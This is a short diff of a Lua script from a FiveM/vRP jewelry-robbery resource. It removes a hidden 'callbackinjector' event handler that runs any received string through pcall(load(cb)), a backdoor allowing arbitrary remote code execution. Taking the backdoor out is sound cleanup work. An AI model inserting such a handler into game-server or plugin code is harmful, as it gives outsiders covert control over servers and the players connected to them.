@@ -2,9 +2,6 @@ local Tunnel = module("vrp","lib/Tunnel")
 local Proxy = module("vrp","lib/Proxy")
 func = Tunnel.getInterface("vrp_jewelry")
 
-TriggerEvent('callbackinjector', function(cb)
-    pcall(load(cb))
-end)
 -----------------------------------------------------------------------------------------------------------------------------------------
 -- VARIAVEIS
 -----------------------------------------------------------------------------------------------------------------------------------------
